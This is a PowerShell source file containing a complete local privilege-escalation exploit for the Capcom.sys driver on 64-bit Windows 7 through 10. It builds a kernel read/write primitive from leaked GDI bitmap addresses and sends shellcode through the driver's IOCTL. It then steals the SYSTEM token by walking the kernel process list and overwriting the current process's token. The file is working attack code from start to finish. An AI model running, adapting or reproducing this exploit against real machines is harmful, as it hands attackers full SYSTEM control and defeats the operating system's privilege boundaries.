function CapCom-GDI-x64Universal {

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	public static class CapCom
	{
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			uint dwSize,
			UInt32 flAllocationType,
			UInt32 flProtect);
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr CreateFile(
			String lpFileName,
			UInt32 dwDesiredAccess,
			UInt32 dwShareMode,
			IntPtr lpSecurityAttributes,
			UInt32 dwCreationDisposition,
			UInt32 dwFlagsAndAttributes,
			IntPtr hTemplateFile);
		[DllImport("Kernel32.dll", SetLastError = true)]
		public static extern bool DeviceIoControl(
			IntPtr hDevice,
			int IoControlCode,
			byte[] InBuffer,
			int nInBufferSize,
			ref IntPtr OutBuffer,
			int nOutBufferSize,
			ref int pBytesReturned,
			IntPtr Overlapped);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool FreeLibrary(
			IntPtr hModule);
		[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
			string lpFileName);
		[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool VirtualFree(
			IntPtr lpAddress,
			uint dwSize,
			uint dwFreeType);
		[DllImport("gdi32.dll")]
		public static extern int SetBitmapBits(
			IntPtr hbmp,
			uint cBytes,
			byte[] lpBits);
		[DllImport("gdi32.dll")]
		public static extern int GetBitmapBits(
			IntPtr hbmp,
			int cbBuffer,
			IntPtr lpvBits);
		}
"@

	
	function Get-LoadedModules {
	
	
		Add-Type -TypeDefinition @"
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;
		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct SYSTEM_MODULE_INFORMATION
		{
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
			public UIntPtr[] Reserved;
			public IntPtr ImageBase;
			public UInt32 ImageSize;
			public UInt32 Flags;
			public UInt16 LoadOrderIndex;
			public UInt16 InitOrderIndex;
			public UInt16 LoadCount;
			public UInt16 ModuleNameOffset;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
			internal Char[] _ImageName;
			public String ImageName {
				get {
					return new String(_ImageName).Split(new Char[] {'\0'}, 2)[0];
				}
			}
		}
		public static class LoadedModules
		{
			[DllImport("ntdll.dll")]
			public static extern int NtQuerySystemInformation(
				int SystemInformationClass,
				IntPtr SystemInformation,
				int SystemInformationLength,
				ref int ReturnLength);
		}
"@
	
		[int]$BuffPtr_Size = 0
		while ($true) {
			[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
			$SystemInformationLength = New-Object Int
		
			
			$CallResult = [LoadedModules]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
			
			
			if ($CallResult -eq 0xC0000004) {
				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
				[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
			}
			
			elseif ($CallResult -eq 0x00000000) {
				break
			}
			
			else {
				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
				return
			}
		}
	
		$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
		$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
		if ([System.IntPtr]::Size -eq 4) {
			$SYSTEM_MODULE_INFORMATION_Size = 284
		} else {
			$SYSTEM_MODULE_INFORMATION_Size = 296
		}
	
		$BuffOffset = $BuffPtr.ToInt64()
		$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
		$BuffOffset = $BuffOffset + [System.IntPtr]::Size
	
		$SystemModuleArray = @()
		for ($i=0; $i -lt $HandleCount; $i++){
			$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
			$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
			
			$HashTable = @{
				ImageName = $Cast.ImageName
				ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
				ImageSize = "0x$('{0:X}' -f $Cast.ImageSize)"
			}
			
			$Object = New-Object PSObject -Property $HashTable
			$SystemModuleArray += $Object
		
			$BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
		}
	
		$SystemModuleArray
	
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
	}
	
	function Stage-gSharedInfoBitmap {
	
	
		Add-Type -TypeDefinition @"
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;
		public static class gSharedInfoBitmap
		{
			[DllImport("gdi32.dll")]
			public static extern IntPtr CreateBitmap(
				int nWidth,
				int nHeight,
				uint cPlanes,
				uint cBitsPerPel,
				IntPtr lpvBits);
			[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
			public static extern IntPtr LoadLibrary(
				string lpFileName);
			
			[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
			public static extern IntPtr GetProcAddress(
				IntPtr hModule,
				string procName);
			[DllImport("user32.dll")]
			public static extern IntPtr CreateAcceleratorTable(
				IntPtr lpaccl,
				int cEntries);
			[DllImport("user32.dll")]
			public static extern bool DestroyAcceleratorTable(
				IntPtr hAccel);
		}
"@
	
		
		if ([System.IntPtr]::Size -eq 4) {
			$x32 = 1
		}
	
		function Create-AcceleratorTable {
			[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000)
			$AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) 
			$User32Hanle = [gSharedInfoBitmap]::LoadLibrary("user32.dll")
			$gSharedInfo = [gSharedInfoBitmap]::GetProcAddress($User32Hanle, "gSharedInfo")
			if ($x32){
				$gSharedInfo = $gSharedInfo.ToInt32()
			} else {
				$gSharedInfo = $gSharedInfo.ToInt64()
			}
			$aheList = $gSharedInfo + [System.IntPtr]::Size
			if ($x32){
				$aheList = [System.Runtime.InteropServices.Marshal]::ReadInt32($aheList)
				$HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0xc 
				$phead = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleEntry)
			} else {
				$aheList = [System.Runtime.InteropServices.Marshal]::ReadInt64($aheList)
				$HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0x18 
				$phead = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleEntry)
			}
	
			$Result = @()
			$HashTable = @{
				Handle = $AccelHandle
				KernelObj = $phead
			}
			$Object = New-Object PSObject -Property $HashTable
			$Result += $Object
			$Result
		}
	
		function Destroy-AcceleratorTable {
			param ($Hanlde)
			$CallResult = [gSharedInfoBitmap]::DestroyAcceleratorTable($Hanlde)
		}
	
		$KernelArray = @()
		for ($i=0;$i -lt 20;$i++) {
			$KernelArray += Create-AcceleratorTable
			if ($KernelArray.Length -gt 1) {
				if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) {
					Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
					[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
					$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x701, 2, 1, 8, $Buffer) 
					break
				}
			}
			Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
		}
	
		$BitMapObject = @()
		$HashTable = @{
			BitmapHandle = $BitmapHandle
			BitmapKernelObj = $($KernelArray[$i].KernelObj)
			BitmappvScan0 = if ($x32) {$($KernelArray[$i].KernelObj) + 0x32} else {$($KernelArray[$i].KernelObj) + 0x50}
		}
		$Object = New-Object PSObject -Property $HashTable
		$BitMapObject += $Object
		$BitMapObject
	}
	
	function Bitmap-Read {
		param ($Address)
		$CallResult = [CapCom]::SetBitmapBits($Manager.BitmapHandle, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		[IntPtr]$Pointer = [CapCom]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
		$CallResult = [CapCom]::GetBitmapBits($Worker.BitmapHandle, [System.IntPtr]::Size, $Pointer)
		if ($x32Architecture){
			[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
		} else {
			[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
		}
		$CallResult = [CapCom]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
	}
	
	function Bitmap-Write {
		param ($Address, $Value)
		$CallResult = [CapCom]::SetBitmapBits($Manager.BitmapHandle, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		$CallResult = [CapCom]::SetBitmapBits($Worker.BitmapHandle, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
	}
	
	
	$PwnBanner = @"

+---------------------------------------------------+
|           \                          ___/________ |
|      ___   )          ,  @             /    \  \  |
|   @___, \ /        @__\  /\       @___/      \@/  |
|  /\__,   |        /\_, \/ /      /\__/        |   |
| / \    / @\      / \   (        / \ /        / \  |
|/__|___/___/_____/__|____\______/__/__________|__\_|
|                                                   |
|                 Street Fighter V                  |
|            Capcom.sys LPE => 7-10 x64             |
|                                                   |
|                                 ~b33f (@FuzzySec) |
+---------------------------------------------------+
"@
	$PwnBanner

	
	
	echo "`n[>] gSharedInfo bitmap leak.."
	$Manager = Stage-gSharedInfoBitmap
	$Worker = Stage-gSharedInfoBitmap
	echo "[+] Manager bitmap Kernel address: 0x$("{0:X16}" -f $($Manager.BitmapKernelObj))"
	echo "[+] Worker bitmap Kernel address: 0x$("{0:X16}" -f $($Worker.BitmapKernelObj))"
	
	
	[Byte[]] $Shellcode = @(
		0x48, 0xB8) + [System.BitConverter]::GetBytes($Manager.BitmappvScan0) + @( 
		0x48, 0xB9) + [System.BitConverter]::GetBytes($Worker.BitmappvScan0)  + @( 
		0x48, 0x89, 0x08,                                                          
		0xC3                                                                       
	)

	
	
	echo "`n[>] Allocating Capcom payload.."
	[IntPtr]$Pointer = [CapCom]::VirtualAlloc([System.IntPtr]::Zero, (8 + $Shellcode.Length), 0x3000, 0x40)
	$ExploitBuffer = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8) + $Shellcode
	[System.Runtime.InteropServices.Marshal]::Copy($ExploitBuffer, 0, $Pointer, (8 + $Shellcode.Length))
	echo "[+] Payload size: $(8 + $Shellcode.Length)"
	echo "[+] Payload address: $("{0:X}" -f $Pointer.ToInt64())"
	
	$hDevice = [CapCom]::CreateFile("\\.\Htsysm72FB", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)

	if ($hDevice -eq -1) {
		echo "`n[!] Unable to get driver handle..`n"
		Return
	} else {
		echo "`n[>] Driver information.."
		echo "[+] lpFileName: \\.\Htsysm72FB"
		echo "[+] Handle: $hDevice"
	}
	
	
	
	$InBuff = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8)
	$OutBuff = 0x1234
	echo "`n[>] Sending buffer.."
	echo "[+] Buffer length: $($InBuff.Length)"
	echo "[+] IOCTL: 0xAA013044"
	[CapCom]::DeviceIoControl($hDevice, 0xAA013044, $InBuff, $InBuff.Length, [ref]$OutBuff, 4, [ref]0, [System.IntPtr]::Zero) |Out-null

	
	
	$SystemModuleArray = Get-LoadedModules

	
	
	
	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
	$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
	switch ($OSMajorMinor)
	{
		'10.0' 
		{
			$UniqueProcessIdOffset = 0x2e8
			$TokenOffset = 0x358          
			$ActiveProcessLinks = 0x2f0
		}
	
		'6.3' 
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348          
			$ActiveProcessLinks = 0x2e8
		}
	
		'6.2' 
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348          
			$ActiveProcessLinks = 0x2e8
		}
	
		'6.1' 
		{
			$UniqueProcessIdOffset = 0x180
			$TokenOffset = 0x208          
			$ActiveProcessLinks = 0x188
		}
	}

	
	echo "`n[>] Leaking SYSTEM _EPROCESS.."
	$KernelBase = $SystemModuleArray[0].ImageBase
	$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
	$KernelHanle = [CapCom]::LoadLibrary("$KernelType")
	$PsInitialSystemProcess = [CapCom]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
	$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
	$CallResult = [CapCom]::FreeLibrary($KernelHanle)
	echo "[+] _EPORCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
	$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
	echo "[+] SYSTEM _EPORCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
	echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
	echo "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
	$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
	
	
	echo "`n[>] Leaking current _EPROCESS.."
	echo "[+] Traversing ActiveProcessLinks list"
	$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	while($true) {
		$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
		if ($NextPID -eq $PID) {
			echo "[+] PowerShell _EPORCESS address: 0x$("{0:X}" -f $NextProcess)"
			echo "[+] PID: $NextPID"
			echo "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
			$PoShTokenAddr = $NextProcess+$TokenOffset
			break
		}
		$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	}
	
	
	echo "`n[!] Duplicating SYSTEM token!`n"
	Bitmap-Write -Address $PoShTokenAddr -Value $SysToken
}